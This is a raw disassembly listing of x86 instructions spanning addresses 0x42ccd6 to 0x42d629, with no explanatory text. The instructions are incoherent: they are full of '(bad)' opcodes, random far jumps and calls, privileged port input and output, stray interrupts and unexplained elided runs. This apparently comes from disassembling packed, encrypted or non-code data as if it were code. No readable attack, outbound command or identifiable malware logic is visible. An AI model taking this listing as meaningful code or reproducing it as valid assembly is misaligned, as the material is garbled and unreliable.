  42ccd6:	mov    dl,0x1
  42ccd8:	ja     0x42cc67
  42ccda:	das    
  42ccdb:	mov    ch,0x38
  42ccdd:	rol    BYTE PTR [eax+0x76553357],1
  42cce3:	push   eax
  42cce4:	pop    ecx
  42cce5:	push   ebx
  42cce6:	mov    ds:0x9f08cc4a,eax
  42cceb:	int3   
  42ccec:	cmp    BYTE PTR ds:0x6d9b9d1d,ch
  42ccf2:	shr    DWORD PTR [ecx+0x51fba781],1
  42ccf8:	xchg   BYTE PTR [edi-0x57],bl
  42ccfb:	mov    ss,ebx
  42ccfd:	dec    ebp
  42ccfe:	ins    DWORD PTR es:[edi],dx
  42ccff:	test   eax,esi
  42cd01:	ficom  WORD PTR [eax-0x76]
  42cd04:	data16 or bl,bl
  42cd07:	inc    ebx
  42cd08:	call   0x490330b
  42cd0d:	sbb    edi,0x54
  42cd10:	jb     0x42ccc2
  42cd12:	add    edi,eax
  42cd14:	mov    ebx,0xa819b4da
  42cd19:	mov    ebx,0xae926d50
  42cd1e:	ret    
  42cd1f:	es jne 0x42cd61
  42cd22:	(bad)  
  42cd23:	sbb    eax,0xf681fe43
  42cd28:	fs mov edi,0xe56edc4f
  42cd2e:	test   BYTE PTR [ecx],0xd3
  42cd31:	dec    eax
  42cd32:	cmp    eax,0x35b1
	...
  42cd93:	add    BYTE PTR [eax],al
  42cd95:	add    BYTE PTR [ecx],bl
  42cd97:	mov    eax,ds:0xdffe87fe
  42cd9c:	jns    0x42cd5d
  42cd9e:	in     eax,0x80
  42cda0:	(bad)  
  42cda2:	xchg   edx,eax
  42cda3:	jmp    0x42cdaf
  42cda5:	fbstp  TBYTE PTR [ebx]
  42cda7:	loopne 0x42cdaa
  42cda9:	add    BYTE PTR [edi],al
  42cdab:	add    DWORD PTR [eax],eax
  42cdad:	add    BYTE PTR [esi],ch
  42cdaf:	rcr    ch,0x1
  42cdb2:	ss and dh,dl
  42cdb5:	lock push esp
  42cdb7:	jbe    0x42cdf9
  42cdb9:	xchg   ebx,eax
  42cdba:	dec    esp
  42cdbb:	push   edi
  42cdbc:	shl    DWORD PTR [esi+0x4e],1
  42cdbf:	jmp    0x42cdf3
  42cdc1:	xor    eax,0xa1ca6659
  42cdc6:	es scas al,BYTE PTR es:[edi]
  42cdc8:	aas    
  42cdc9:	sbb    al,0x7b
  42cdcb:	cmp    al,0x5a
  42cdcd:	pop    edx
  42cdce:	mov    edx,0xa8285b7a
  42cdd3:	mov    esp,0x7de29452
  42cdd8:	in     al,dx
  42cdd9:	out    dx,eax
  42cdda:	jbe    0x42cdb8
  42cddc:	idiv   al
  42cdde:	sbb    ebx,DWORD PTR ds:0x746a72af
  42cde4:	out    0xf9,al
  42cde6:	push   0xffffffd2
  42cde8:	imul   ebx,DWORD PTR [esi+0x6b3b8973],0x0
  42cdef:	outs   dx,BYTE PTR ds:[esi]
  42cdf0:	ror    BYTE PTR gs:[ecx-0x1],0xf5
  42cdf5:	sar    DWORD PTR [edi+0x2a],0x58
  42cdf9:	inc    ebp
  42cdfa:	fsub   st(1),st
  42cdfc:	test   DWORD PTR [eax],eax
  42cdfe:	out    dx,eax
  42cdff:	mov    edx,0x7fe55f67
  42ce04:	test   eax,0xda199927
  42ce09:	inc    esi
  42ce0a:	adc    DWORD PTR [eax],0xffffffe2
  42ce0d:	xchg   esp,eax
  42ce0e:	xor    ecx,esp
  42ce10:	mov    ds,WORD PTR [eax]
  42ce12:	lods   al,BYTE PTR ds:[esi]
  42ce13:	mov    DWORD PTR [esi],ecx
  42ce15:	or     eax,0x9816f65f
  42ce1a:	xor    edi,DWORD PTR [eax-0x29]
  42ce1d:	mov    ebp,0xddd070b
  42ce22:	in     al,dx
  42ce23:	dec    ebx
  42ce24:	jmp    0x1a90f33c
  42ce29:	push   ecx
  42ce2a:	jmp    0x7c0:0x1bc550d7
  42ce31:	pop    esi
  42ce32:	sbb    ebx,DWORD PTR [eax+0x4d]
  42ce35:	js     0x42ce38
  42ce37:	or     al,0xf0
  42ce39:	push   0xffffff80
  42ce3b:	stos   BYTE PTR es:[edi],al
  42ce3c:	sbb    ebp,0x5a35a97d
  42ce42:	or     eax,0x51961dea
  42ce47:	cmp    eax,0x7d984a8b
  42ce4c:	mov    esi,0xf2519376
  42ce51:	inc    edx
  42ce52:	scas   eax,DWORD PTR es:[edi]
  42ce53:	(bad)  
  42ce54:	jl     0x42cea9
  42ce56:	cmp    eax,0x57929f11
  42ce5b:	ja     0x42ce09
  42ce5d:	sbb    eax,0x3f007170
  42ce62:	pushf  
  42ce63:	imul   esi,DWORD PTR [esi+0x41],0x22
  42ce67:	imul   ebx,DWORD PTR [esp+ebx*8],0xc2e7a93c
  42ce6e:	dec    esp
  42ce6f:	sar    BYTE PTR [ebp+0x7a],cl
  42ce72:	pop    ds
  42ce73:	inc    edx
  42ce74:	fcmovb st,st(5)
  42ce76:	push   cs
  42ce77:	add    eax,DWORD PTR [eax-0x64f1b263]
  42ce7d:	xchg   ecx,eax
  42ce7e:	inc    edi
  42ce7f:	and    ebx,ebp
  42ce81:	dec    ecx
  42ce82:	jno    0x42ce14
  42ce84:	xchg   edi,eax
  42ce85:	and    BYTE PTR [eax],al
  42ce87:	jae    0x42ce31
  42ce89:	pop    ebx
  42ce8a:	loope  0x42cefe
  42ce8c:	xchg   edx,eax
  42ce8d:	inc    BYTE PTR [ebx]
  42ce8f:	imul   edi,DWORD PTR [edi],0x94749ae3
  42ce95:	out    dx,eax
  42ce96:	cmp    BYTE PTR [esi],0xeb
  42ce99:	inc    ebx
  42ce9a:	retf   
  42ce9b:	adc    eax,0x335b72a2
  42cea0:	and    BYTE PTR [ecx],cl
  42cea2:	mov    ah,0xd6
  42cea4:	hlt    
  42cea5:	imul   esp,DWORD PTR [ebx],0x66cc0362
  42ceab:	mov    esp,0x9c4cba4c
  42ceb0:	shl    ecx,1
  42ceb2:	jge    0x42ceab
  42ceb4:	mov    ah,0x0
	...
  42cf16:	jae    0x42cf55
  42cf18:	fadd   st,st(1)
  42cf1a:	fsubrp st(5),st
  42cf1c:	jnp    0x42cedd
  42cf1e:	mov    esi,DWORD PTR [ebx-0x5ca8d2ef]
  42cf24:	mov    bh,0xc
  42cf26:	cmp    ah,cl
  42cf28:	add    DWORD PTR [eax],eax
  42cf2a:	pop    es
  42cf2b:	add    DWORD PTR [eax],eax
  42cf2d:	add    BYTE PTR [edx+0x61],al
  42cf30:	mov    edi,0xa6f5e01b
  42cf35:	stc    
  42cf36:	out    dx,eax
  42cf37:	lods   al,BYTE PTR ds:[esi]
  42cf38:	mul    BYTE PTR [edx]
  42cf3a:	into   
  42cf3b:	pop    edx
  42cf3c:	xor    dh,BYTE PTR [ebx-0x43]
  42cf3f:	out    dx,al
  42cf40:	push   edx
  42cf41:	sub    ebp,edx
  42cf43:	sbb    BYTE PTR [eax],ch
  42cf45:	js     0x42cf24
  42cf47:	ds das 
  42cf49:	arpl   WORD PTR [ebx],ax
  42cf4b:	inc    ecx
  42cf4c:	push   esi
  42cf4d:	add    dl,cl
  42cf4f:	and    DWORD PTR [esi],edx
  42cf51:	sbb    al,0x59
  42cf53:	xchg   esp,eax
  42cf54:	lahf   
  42cf55:	std    
  42cf56:	xchg   esi,eax
  42cf57:	scas   al,BYTE PTR es:[edi]
  42cf58:	rcl    DWORD PTR [ecx+edi*2],0x35
  42cf5c:	call   0x3386:0xa7149c5f
  42cf63:	jmp    0xcb4ed3a2
  42cf68:	test   BYTE PTR [ebx+0x6cf0a844],dl
  42cf6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cf6f:	jp     0x42cfa9
  42cf71:	fldenv [ebx-0x7d0df11b]
  42cf77:	aam    0xf2
  42cf79:	scas   eax,DWORD PTR es:[edi]
  42cf7a:	push   esp
  42cf7b:	dec    eax
  42cf7c:	jle    0x42cf5b
  42cf7e:	(bad)  
  42cf7f:	shl    DWORD PTR [edi+0x4c],cl
  42cf82:	push   cs
  42cf83:	inc    esp
  42cf84:	mov    edx,0x4a0b6b1f
  42cf89:	pop    edx
  42cf8a:	cmc    
  42cf8b:	adc    BYTE PTR [edx-0x64],0x52
  42cf8f:	popf   
  42cf90:	inc    esp
  42cf91:	xchg   DWORD PTR [ebx+0x5b481d9c],ebx
  42cf97:	dec    esp
  42cf98:	data16 (bad) 
  42cf9a:	aaa    
  42cf9b:	jmp    0x42cfbf
  42cf9d:	cmc    
  42cf9e:	xchg   edi,eax
  42cf9f:	mov    WORD PTR [eax-0x7d],ds
  42cfa2:	aas    
  42cfa3:	xlat   BYTE PTR ds:[ebx]
  42cfa4:	push   ds
  42cfa5:	jno    0x42cf62
  42cfa7:	and    BYTE PTR [ebx+edx*8+0x3c],ah
  42cfab:	mov    al,ds:0x237ee022
  42cfb0:	out    dx,eax
  42cfb1:	sbb    ebx,DWORD PTR [ebp+ebx*4-0x7a]
  42cfb5:	or     ch,BYTE PTR ss:[edi]
  42cfb8:	jmp    0x6b04:0x5e0412ed
  42cfbf:	or     edi,ebx
  42cfc1:	jle    0x42d030
  42cfc3:	rcr    DWORD PTR [edx+0x8],0x44
  42cfc7:	jno    0x42cfb2
  42cfc9:	es jmp 0x389a0ae0
  42cfcf:	cld    
  42cfd0:	fistp  DWORD PTR [esi*4-0x67b9abd5]
  42cfd7:	jbe    0x42d02e
  42cfd9:	in     al,0xa9
  42cfdb:	icebp  
  42cfdc:	adc    al,0xba
  42cfde:	push   0x592fc556
  42cfe3:	adc    BYTE PTR [esi-0x3b47578d],0x14
  42cfea:	cmc    
  42cfeb:	jae    0x42d047
  42cfed:	pop    ss
  42cfee:	add    al,0xd
  42cff0:	aam    0xfa
  42cff2:	cmc    
  42cff3:	and    BYTE PTR [esi+0x155d824],bh
  42cff9:	push   0x369662ed
  42cffe:	inc    esp
  42cfff:	sbb    al,0x86
  42d002:	xor    eax,0xaeaed51c
  42d007:	mov    dh,0xb6
  42d009:	and    al,0x53
  42d00b:	push   eax
  42d00c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d00d:	cmp    eax,DWORD PTR [esi-0x4c]
  42d010:	pop    eax
  42d011:	dec    esp
  42d012:	int    0xd0
  42d014:	pop    eax
  42d015:	jae    0x42cf99
  42d017:	retf   
  42d018:	aas    
  42d019:	pop    ebx
  42d01a:	xor    DWORD PTR [ebx+0xf],esp
  42d01d:	outs   dx,BYTE PTR ds:[esi]
  42d01e:	add    DWORD PTR [edx],0x57
  42d021:	mov    edi,0x763ef4db
  42d026:	(bad)  
  42d028:	or     ah,ch
  42d02a:	jne    0x42d099
  42d02c:	fistp  DWORD PTR [edx-0x5909047e]
  42d032:	jle    0x42d01d
  42d034:	in     eax,dx
	...
  42d095:	add    BYTE PTR [eax+0x3a],dl
  42d098:	(bad)  
  42d099:	sub    al,0xee
  42d09b:	cld    
  42d09c:	cli    
  42d09d:	jle    0x42d0ad
  42d09f:	fmul   DWORD PTR [ebp-0xa]
  42d0a2:	push   ebx
  42d0a3:	add    DWORD PTR [edx-0x5],edi
  42d0a6:	inc    ecx
  42d0a7:	loop   0x42d0aa
  42d0a9:	add    BYTE PTR [edi],al
  42d0ab:	add    DWORD PTR [eax],eax
  42d0ad:	add    BYTE PTR [eax+0x5],al
  42d0b0:	mov    ecx,0x1361a0a
  42d0b5:	xor    DWORD PTR [ebx-0x27f4e8a],ecx
  42d0bb:	mov    dl,0x37
  42d0bd:	or     eax,DWORD PTR [edi]
  42d0bf:	sar    DWORD PTR [ebp+0x5e41ddfa],1
  42d0c5:	ds add ebp,esi
  42d0c8:	pop    es
  42d0c9:	in     al,dx
  42d0ca:	in     eax,dx
  42d0cb:	fld    TBYTE PTR [esi]
  42d0cd:	pop    edi
  42d0ce:	xlat   BYTE PTR ds:[ebx]
  42d0cf:	aad    0x2c
  42d0d1:	imul   BYTE PTR [esi+0x74a0c51a]
  42d0d7:	aaa    
  42d0d8:	clc    
  42d0d9:	push   ebp
  42d0da:	ds jp  0x42d0f5
  42d0dd:	or     eax,0xdfb5f35b
  42d0e2:	sub    BYTE PTR [ebp+0x64],bh
  42d0e5:	dec    esi
  42d0e6:	test   BYTE PTR [edi],dh
  42d0e8:	outs   dx,DWORD PTR ds:[esi]
  42d0e9:	sbb    al,0xfe
  42d0eb:	jp     0x42d152
  42d0ed:	ss and eax,0x5e544d73
  42d0f3:	out    dx,al
  42d0f4:	out    dx,al
  42d0f5:	stos   BYTE PTR es:[edi],al
  42d0f6:	mov    ebp,0xa665139c
  42d0fb:	adc    ebx,DWORD PTR [ebx]
  42d0fd:	sub    al,0x9
  42d0ff:	je     0x42d164
  42d101:	mov    dh,0x21
  42d103:	xchg   ecx,eax
  42d104:	lods   eax,DWORD PTR ds:[esi]
  42d105:	leave  
  42d106:	mov    ebp,0x4e4bc360
  42d10b:	ins    DWORD PTR es:[edi],dx
  42d10c:	loope  0x42d0ee
  42d10e:	lahf   
  42d10f:	adc    DWORD PTR [edi+0x55ca8e6],edx
  42d115:	xchg   bx,ax
  42d117:	sbb    BYTE PTR [edx+0x1e],bh
  42d11a:	call   FWORD PTR [ebp-0x4e8d4776]
  42d120:	push   ebp
  42d121:	mov    cl,0x57
  42d123:	mov    ch,0x8b
  42d125:	(bad)
  42d128:	adc    DWORD PTR [esi],ebp
  42d12a:	push   0x7b51b5e8
  42d12f:	outs   dx,DWORD PTR ds:[esi]
  42d130:	jb     0x42d0f9
  42d132:	(bad)  
  42d133:	div    DWORD PTR [eax+0x6f]
  42d136:	int    0x95
  42d138:	in     al,0xe
  42d13a:	out    dx,eax
  42d13b:	sub    DWORD PTR [eax],esi
  42d13d:	clc    
  42d13e:	stc    
  42d13f:	sub    bh,BYTE PTR [edi+0x40]
  42d142:	sbb    edi,esi
  42d144:	ret    
  42d145:	sti    
  42d146:	sub    al,0xc3
  42d148:	int    0xa4
  42d14a:	mov    al,0xfb
  42d14c:	stos   BYTE PTR es:[edi],al
  42d14d:	sbb    DWORD PTR [ebx],edi
  42d14f:	sar    DWORD PTR [eax+0x25],cl
  42d152:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d153:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d154:	push   ss
  42d155:	dec    esp
  42d156:	iret   
  42d157:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d158:	pop    ebx
  42d159:	rcr    BYTE PTR [ecx+eax*8-0x6656be95],1
  42d160:	or     ebx,DWORD PTR ds:0x9b5e05fe
  42d166:	or     al,0x17
  42d168:	loop   0x42d1dc
  42d16a:	cmp    eax,0x83b1a51c
  42d16f:	fs and al,bl
  42d172:	xchg   ebp,eax
  42d173:	adc    ebp,ecx
  42d175:	and    eax,0xe743ec3d
  42d17a:	cwde   
  42d17b:	repz enter 0x2af1,0xaf
  42d180:	out    0x11,eax
  42d182:	pusha  
  42d183:	xlat   BYTE PTR ds:[ebx]
  42d184:	ds popa 
  42d186:	sar    DWORD PTR [eax+0x62],0x67
  42d18a:	push   0x2b8c260c
  42d18f:	jb     0x42d16d
  42d191:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d192:	xchg   esi,eax
  42d193:	(bad)  
  42d194:	lock ret 
  42d196:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d197:	lds    esp,FWORD PTR [edi+0x767949e3]
  42d19d:	sbb    ebp,esp
  42d19f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d1a0:	and    DWORD PTR [ebp+ebx*2+0x7c],0xffffffd7
  42d1a5:	xor    eax,0xcb9d3096
  42d1aa:	rol    DWORD PTR [edx+0x31],0x8a
  42d1ae:	adc    ebp,ebp
  42d1b0:	je     0x42d17a
  42d1b2:	pop    edx
  42d1b3:	rol    BYTE PTR [edi],1
	...
  42d215:	add    BYTE PTR [ebp-0x2289a2f8],cl
  42d21b:	ja     0x42d1cc
  42d21d:	sti    
  42d21e:	ret    
  42d21f:	or     ebx,esp
  42d221:	pop    ds
  42d222:	dec    bp
  42d224:	imul   ebx,DWORD PTR [ebp+0x48],0xffffffe3
  42d228:	add    DWORD PTR [eax],eax
  42d22a:	pop    es
  42d22b:	add    DWORD PTR [eax],eax
  42d22d:	add    BYTE PTR [edx],bh
  42d22f:	mov    ah,0x59
  42d231:	pusha  
  42d232:	xor    BYTE PTR [esi-0x3de1e55a],bl
  42d238:	push   esi
  42d239:	adc    eax,0x4fed415b
  42d23e:	(bad)  
  42d240:	ins    DWORD PTR es:[edi],dx
  42d241:	sub    BYTE PTR [ecx],dl
  42d243:	fadd   st,st(7)
  42d245:	cmp    bh,BYTE PTR [edx+0x2a]
  42d248:	xchg   esi,eax
  42d249:	in     eax,dx
  42d24a:	sub    al,0xd9
  42d24c:	inc    BYTE PTR [ebx-0x1dd76d91]
  42d252:	jno    0x42d234
  42d254:	xchg   edi,eax
  42d255:	aam    0x7f
  42d257:	test   eax,0xdc7b25a3
  42d25c:	inc    esi
  42d25d:	sub    eax,0x2f4df3fd
  42d262:	jne    0x42d21b
  42d264:	add    esi,DWORD PTR [edx]
  42d266:	lea    eax,[eax+0x33ee1be2]
  42d26c:	ja     0x42d273
  42d26e:	push   ss
  42d26f:	and    dh,0x52
  42d272:	lods   al,BYTE PTR ds:[esi]
  42d273:	ins    BYTE PTR es:[edi],dx
  42d274:	jb     0x42d273
  42d276:	fs retf 0x3f3d
  42d27a:	iret   
  42d27b:	or     ecx,ecx
  42d27d:	and    al,0xdd
  42d27f:	call   0x1d0b:0x3dc0d284
  42d286:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d287:	xor    ah,BYTE PTR [eax]
  42d289:	lock hlt 
  42d28b:	cmp    bh,BYTE PTR [edx]
  42d28d:	dec    ebp
  42d28e:	imul   ebp,ebx,0xffffffc6
  42d291:	arpl   WORD PTR [ebx],si
  42d293:	fstp   TBYTE PTR [esi]
  42d295:	xor    DWORD PTR [esi+0x2887a28b],ecx
  42d29b:	cmp    DWORD PTR [edx],ecx
  42d29d:	repz popa 
  42d29f:	fisub  WORD PTR [ebx]
  42d2a1:	aad    0x0
  42d2a3:	xchg   ebp,eax
  42d2a4:	jo     0x42d2ad
  42d2a6:	test   DWORD PTR [edx],esi
  42d2a8:	sbb    al,BYTE PTR [edi]
  42d2aa:	outs   dx,DWORD PTR ds:[esi]
  42d2ab:	add    ebp,ebx
  42d2ad:	test   DWORD PTR [edx+0x1c],edi
  42d2b0:	add    BYTE PTR [edi],0x54
  42d2b3:	pop    esp
  42d2b4:	dec    edi
  42d2b5:	sub    eax,DWORD PTR [eax+0x71789826]
  42d2bb:	mov    cl,0x51
  42d2bd:	retf   0x1f8d
  42d2c0:	(bad)  
  42d2c1:	repz mov cl,0xe
  42d2c4:	mov    ds:0x136bb257,eax
  42d2c9:	imul   edi,DWORD PTR [eax+0x294881ca],0xd118be7
  42d2d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d2d4:	inc    ecx
  42d2d5:	inc    ebp
  42d2d6:	out    dx,eax
  42d2d7:	ds scas al,BYTE PTR es:[edi]
  42d2d9:	and    al,BYTE PTR [esi]
  42d2db:	xchg   edi,eax
  42d2dc:	cmp    eax,0x3cc505ff
  42d2e1:	jo     0x42d30d
  42d2e3:	rcl    DWORD PTR [ecx],0xa4
  42d2e6:	or     DWORD PTR [edx],esi
  42d2e8:	fistp  WORD PTR [edx+ecx*8+0x64]
  42d2ec:	mov    ebp,0xe92b5db4
  42d2f1:	(bad)  
  42d2f2:	shr    BYTE PTR [edx-0x6760c9ea],cl
  42d2f8:	jp     0x42d2d9
  42d2fa:	xchg   DWORD PTR [ebp+0x63],ecx
  42d2fd:	adc    al,0x2f
  42d2ff:	lods   eax,DWORD PTR ds:[esi]
  42d300:	mov    esi,?
  42d302:	dec    ebx
  42d303:	inc    esp
  42d304:	adc    al,0x14
  42d306:	add    dh,al
  42d308:	int    0x58
  42d30a:	xor    esi,DWORD PTR [ecx+ebx*8]
  42d30d:	pushf  
  42d30e:	clc    
  42d30f:	mul    BYTE PTR [ebp+0x6e]
  42d312:	dec    edi
  42d313:	int    0x91
  42d315:	sar    esp,cl
  42d317:	or     eax,0x7e613a9e
  42d31c:	in     al,0xc8
  42d31e:	pushf  
  42d31f:	inc    esp
  42d320:	fsub   DWORD PTR [esi]
  42d322:	pop    ds
  42d323:	add    DWORD PTR [ebx-0x2ecad734],edi
  42d329:	(bad)  
  42d32a:	or     eax,0x7d456c33
  42d32f:	adc    eax,0xafb747ed
  42d334:	add    al,BYTE PTR [eax]
	...
  42d396:	ror    esi,0x63
  42d399:	cdq    
  42d39a:	outs   dx,DWORD PTR ds:[esi]
  42d39b:	mov    ebp,0x9c38defb
  42d3a0:	int3   
  42d3a1:	pop    eax
  42d3a2:	and    ah,al
  42d3a4:	lods   al,BYTE PTR ds:[esi]
  42d3a5:	test   eax,0x1e44f
  42d3aa:	pop    es
  42d3ab:	add    DWORD PTR [eax],eax
  42d3ad:	add    BYTE PTR [ebp+0x74e79141],cl
  42d3b3:	inc    edx
  42d3b4:	mov    bh,0x6d
  42d3b6:	xor    al,0x1a
  42d3b8:	bnd jmp 0x6a03aae3
  42d3be:	test   al,0x7f
  42d3c0:	adc    al,0xa8
  42d3c2:	xor    al,0xa4
  42d3c4:	xchg   BYTE PTR [ebp+0x4a474b30],dh
  42d3ca:	cld    
  42d3cb:	cmp    esp,DWORD PTR [ebp-0x57f51344]
  42d3d1:	jnp    0x42d3ff
  42d3d3:	cdq    
  42d3d4:	ret    
  42d3d5:	jmp    0x42d397
  42d3d7:	(bad)  
  42d3d8:	cld    
  42d3d9:	mov    bh,0x71
  42d3db:	dec    esi
  42d3dc:	mov    ch,0x33
  42d3de:	ss sub esp,ebp
  42d3e1:	and    eax,0x331430eb
  42d3e6:	es (bad) 
  42d3e8:	jmp    0x42d388
  42d3ea:	or     edx,ebp
  42d3ec:	xor    ch,al
  42d3ee:	jno    0x42d458
  42d3f0:	or     DWORD PTR [esp+edi*8],eax
  42d3f3:	sti    
  42d3f4:	mov    dl,0xee
  42d3f6:	xchg   ebx,eax
  42d3f7:	xchg   edi,eax
  42d3f8:	retf   
  42d3f9:	mov    al,ds:0x1f56e9b1
  42d3fe:	scas   al,BYTE PTR es:[edi]
  42d3ff:	lds    ebp,FWORD PTR [edx]
  42d401:	or     BYTE PTR [ebp+0x65be22fa],dl
  42d407:	icebp  
  42d408:	outs   dx,DWORD PTR ds:[esi]
  42d409:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d40a:	push   0xdaaa862
  42d40f:	stc    
  42d410:	lods   al,BYTE PTR ds:[esi]
  42d411:	sti    
  42d412:	into   
  42d413:	int    0x88
  42d415:	jo     0x42d3ca
  42d417:	pushf  
  42d418:	das    
  42d419:	bound  edi,QWORD PTR [edx+0x61]
  42d41c:	ret    
  42d41d:	xor    ebp,ebp
  42d41f:	pop    ebp
  42d420:	push   ebp
  42d421:	daa    
  42d422:	cmp    BYTE PTR [ecx],ch
  42d424:	push   0x3789ec8f
  42d429:	xor    al,0x3d
  42d42b:	cmp    al,0xe
  42d42d:	fist   WORD PTR [ebp-0x34]
  42d430:	push   edx
  42d431:	add    BYTE PTR [esi],ah
  42d433:	and    ch,BYTE PTR [ecx-0x58]
  42d436:	lock and BYTE PTR [esi-0x4e276af9],dl
  42d43d:	(bad)  
  42d43e:	mov    ds:0xeff4a227,eax
  42d443:	idiv   BYTE PTR [eax+edi*2+0x53]
  42d447:	std    
  42d448:	pop    ds
  42d449:	repnz outs dx,BYTE PTR ds:[esi]
  42d44b:	retf   0xc2a3
  42d44e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d44f:	je     0x42d46e
  42d451:	xchg   DWORD PTR [eax],edi
  42d453:	ins    DWORD PTR es:[edi],dx
  42d454:	adc    al,cl
  42d456:	cmp    DWORD PTR [eax],0x787b0964
  42d45c:	mov    esp,ecx
  42d45e:	ss push edx
  42d460:	aaa    
  42d461:	inc    ecx
  42d462:	xor    DWORD PTR [ecx+0x4e],edi
  42d465:	and    DWORD PTR [eax+0x722e8032],edx
  42d46b:	push   ds
  42d46c:	cwde   
  42d46d:	mov    edi,DWORD PTR [edi-0x5a20f3c9]
  42d473:	sbb    al,0x29
  42d475:	sti    
  42d476:	jnp    0x42d4e7
  42d478:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d479:	mov    ds:0x573a9be6,al
  42d47e:	dec    ecx
  42d47f:	adc    al,0x27
  42d481:	jge    0x42d466
  42d483:	outs   dx,BYTE PTR ds:[esi]
  42d484:	sbb    BYTE PTR [ecx],ch
  42d486:	test   DWORD PTR [esi+0x6e],esp
  42d489:	jo     0x42d47b
  42d48b:	push   eax
  42d48c:	dec    DWORD PTR [edi+ebp*8]
  42d48f:	jl     0x42d50c
  42d491:	adc    eax,0x87ed93b6
  42d496:	(bad)  
  42d497:	retf   0x19ba
  42d49a:	ret    0x3f2a
  42d49d:	mov    ecx,0xdae8aeab
  42d4a2:	test   esi,edi
  42d4a4:	outs   dx,BYTE PTR ds:[esi]
  42d4a5:	sar    DWORD PTR [eax+0x6c],0x19
  42d4a9:	popf   
  42d4aa:	fnstenv [eax]
  42d4ac:	int    0xbd
  42d4ae:	push   ds
  42d4af:	sbb    eax,0x79bbdd01
  42d4b4:	les    eax,FWORD PTR [eax]
	...
  42d516:	cdq    
  42d517:	cmc    
  42d518:	adc    BYTE PTR [ebx-0x12],0x77
  42d51c:	fcos   
  42d51e:	add    BYTE PTR [ebx],al
  42d520:	nop
  42d521:	repz xlat BYTE PTR ds:[ebx]
  42d523:	adc    esp,0xffffffea
  42d526:	push   esi
  42d527:	in     eax,0x1
  42d529:	add    BYTE PTR [edi],al
  42d52b:	add    DWORD PTR [eax],eax
  42d52d:	add    BYTE PTR [ebp+0x6f],dh
  42d530:	(bad)  
  42d531:	dec    esi
  42d532:	ret    
  42d533:	test   esp,ebx
  42d535:	pop    ecx
  42d536:	pushf  
  42d537:	push   es
  42d538:	out    0x9a,eax
  42d53a:	mov    esp,0x37053d19
  42d53f:	aam    0x17
  42d541:	arpl   WORD PTR [ebx+0x5d],dx
  42d544:	ret    
  42d545:	dec    esp
  42d546:	sbb    al,0xd1
  42d548:	rcl    ecx,1
  42d54a:	icebp  
  42d54b:	(bad)  
  42d54c:	xlat   BYTE PTR ds:[ebx]
  42d54d:	repnz add al,0x42
  42d550:	sub    DWORD PTR [ecx+0x5aba0948],edi
  42d556:	inc    esi
  42d557:	imul   BYTE PTR [edx-0x152c22c7]
  42d55d:	mov    esi,0x31aaf935
  42d562:	jmp    0x3878:0xd83d1a79
  42d569:	dec    esp
  42d56a:	push   ebx
  42d56b:	pushf  
  42d56c:	xlat   BYTE PTR ds:[ebx]
  42d56d:	mov    dl,0x86
  42d56f:	(bad)  [esi-0xb]
  42d572:	mov    WORD PTR [eax],cs
  42d574:	dec    edx
  42d575:	mov    esp,0xefcf3489
  42d57a:	mov    DWORD PTR [ecx+0x7c],ebp
  42d57d:	lea    edi,[esi]
  42d57f:	dec    edi
  42d580:	pushf  
  42d581:	stos   DWORD PTR es:[edi],eax
  42d582:	lea    edx,[edx+0xfa6822e]
  42d588:	xor    al,bl
  42d58a:	jo     0x42d550
  42d58c:	mov    ?,WORD PTR [esi-0x28]
  42d58f:	push   eax
  42d590:	dec    ebp
  42d591:	adc    esi,DWORD PTR [ecx]
  42d593:	mov    edx,0xd1c2fc4b
  42d598:	std    
  42d599:	mov    bl,0x3c
  42d59b:	inc    edx
  42d59c:	or     al,0x1c
  42d59e:	or     al,0x70
  42d5a0:	inc    ebp
  42d5a1:	hlt    
  42d5a2:	scas   eax,DWORD PTR es:[edi]
  42d5a3:	div    bh
  42d5a5:	adc    al,0x58
  42d5a7:	mov    ds:0x15eec64,al
  42d5ac:	(bad)  
  42d5ad:	bound  edi,QWORD PTR [esi+0x17019e77]
  42d5b3:	std    
  42d5b4:	mov    edx,0x9c8b815b
  42d5b9:	mov    ds:0xb17c8ad0,eax
  42d5be:	mov    ecx,0x84633db1
  42d5c3:	jo     0x42d62a
  42d5c5:	stos   BYTE PTR es:[edi],al
  42d5c6:	jne    0x42d5a8
  42d5c8:	(bad)  
  42d5c9:	cwde   
  42d5ca:	add    DWORD PTR ds:0xaffedc56,esi
  42d5d0:	inc    ecx
  42d5d1:	gs or  ebx,edi
  42d5d4:	retf   
  42d5d5:	test   BYTE PTR [esi],cl
  42d5d7:	or     DWORD PTR [ebx+0x72a45b2b],edx
  42d5dd:	mov    esp,DWORD PTR [edx+eax*2]
  42d5e0:	fbstp  TBYTE PTR [ebx]
  42d5e2:	push   edx
  42d5e3:	mov    al,BYTE PTR [ebp+0x27]
  42d5e6:	xchg   ebp,eax
  42d5e7:	add    DWORD PTR ds:0xb161648,edx
  42d5ed:	mov    esi,0x6bf030fa
  42d5f2:	mov    bh,0xc6
  42d5f4:	loop   0x42d577
  42d5f6:	les    ebp,FWORD PTR [edx]
  42d5f8:	ins    BYTE PTR es:[edi],dx
  42d5f9:	sbb    DWORD PTR [ebx-0x4ea36c25],ebp
  42d5ff:	dec    ebp
  42d600:	xor    BYTE PTR [esi-0x66],0x6e
  42d604:	popf   
  42d605:	lahf   
  42d606:	rcl    edi,1
  42d608:	sbb    edi,eax
  42d60a:	fxch   st(3)
  42d60c:	mov    eax,0x7b809e6a
  42d611:	imul   esp,DWORD PTR ds:0xf950ddb6,0x43a241cd
  42d61b:	cwde   
  42d61c:	pop    ebp
  42d61d:	xchg   ebx,eax
  42d61e:	cmp    al,BYTE PTR [edi]
  42d620:	popa   
  42d621:	rcr    ch,1
  42d623:	mov    cl,0x7b
  42d625:	and    al,al
  42d627:	aam    0xee
  42d629:	dec    ecx
